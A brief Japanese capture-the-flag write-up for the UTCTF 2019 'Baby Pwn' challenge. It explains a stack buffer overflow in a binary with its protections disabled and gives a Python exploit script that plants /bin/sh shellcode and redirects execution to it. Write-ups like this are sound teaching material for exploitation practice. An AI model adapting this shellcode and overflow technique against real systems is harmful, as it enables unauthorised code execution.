# [pwn 650pts] Baby Pwn - UTCTF
64ビットバイナリですが，いろいろ無効です．
```
$ checksec babypwn 
[*] '/home/ptr/writeups/2019/UTCTF_2019/babypwn/babypwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
IDAで解析しましょう．

まずグローバル変数nameに名前を入力できます．

次に演算子とオペランドを入力すると計算結果を出力してくれます．
ここで，オペランドの入力にスタックオーバーフロー脆弱性が存在します．
ということでnameにシェルコードを入れてリターンアドレスをnameのアドレスに書き換えればシェルが奪えます．

ただし，オーバーフロー時に演算子を破壊すると，終了前の演算子チェックで終了してしまうので，演算子の文字は破壊しないように注意しましょう．

```python
from ptrlib import *

elf = ELF("./babypwn")
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

shellcode = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"

sock = Process("stdbuf -i 0 -o 0 ./babypwn".split())
#sock = Socket("stack.overflow.fail", 9000)

payload = b"+" * 0x90
payload += p64(elf.symbol('name')) * 8

sock.recvuntil("name?\n")
sock.sendline(shellcode)
sock.sendline("+")
sock.sendline("1")
sock.sendline(payload)

sock.interactive()
```

# 感想
初心者向けのオーバーフロー問題ですね．
